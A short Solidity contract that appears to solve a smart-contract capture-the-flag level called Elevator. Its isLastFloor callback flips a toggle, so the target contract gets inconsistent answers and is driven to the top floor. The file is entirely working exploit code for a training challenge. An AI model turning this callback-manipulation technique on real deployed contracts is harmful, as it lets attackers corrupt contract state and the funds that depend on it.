// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorHack {
    IElevator public challenge;
    bool public toggle = true;
    constructor(address challengeAddress) {
        challenge = IElevator(challengeAddress);
    }

    function attack(uint _floor) external payable {
        challenge.goTo(_floor);
    }

    function isLastFloor(uint256 /* floor */) external returns (bool) {
        toggle = !toggle;
        return toggle;
    }
}